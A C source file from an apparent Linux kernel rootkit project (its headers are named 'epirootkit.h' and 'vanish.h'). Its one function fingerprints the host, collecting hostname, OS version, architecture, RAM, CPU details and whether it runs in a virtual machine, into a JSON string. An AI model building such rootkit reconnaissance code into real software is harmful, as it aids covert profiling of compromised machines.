#include "sysinfo.h"

#include <linux/cpu.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/slab.h>
#include <linux/string.h>
#include <linux/utsname.h>

#include "epirootkit.h"
#include "vanish.h"

char *get_sysinfo(void) {
    struct new_utsname *uts = utsname();
    char *info = kmalloc(STD_BUFFER_SIZE, GFP_KERNEL);
    if (!info)
        return NULL;

    unsigned long ram_mb = (totalram_pages() << PAGE_SHIFT) / 1024 / 1024;
    int cpu_count = num_online_cpus();
    const char *cpu_model = boot_cpu_data.x86_model_id[0] ? boot_cpu_data.x86_model_id : "Unknown";

    snprintf(info, STD_BUFFER_SIZE,
             "{\n"
             "  \"hostname\": \"%s\",\n"
             "  \"system\": \"%s\",\n"
             "  \"virtual_env\": \"%s\",\n"
             "  \"release\": \"%s\",\n"
             "  \"version\": \"%s\",\n"
             "  \"architecture\": \"%s\",\n"
             "  \"ram_mb\": \"%lu\",\n"
             "  \"cpu_model\": \"%s\",\n"
             "  \"cpu_cores\": \"%d\"\n"
             "}\n",
             uts->nodename,
             uts->sysname,
             is_running_in_virtual_env() ? "True" : "False",
             uts->release,
             uts->version,
             uts->machine,
             ram_mb,
             cpu_model,
             cpu_count);

    return info;
}
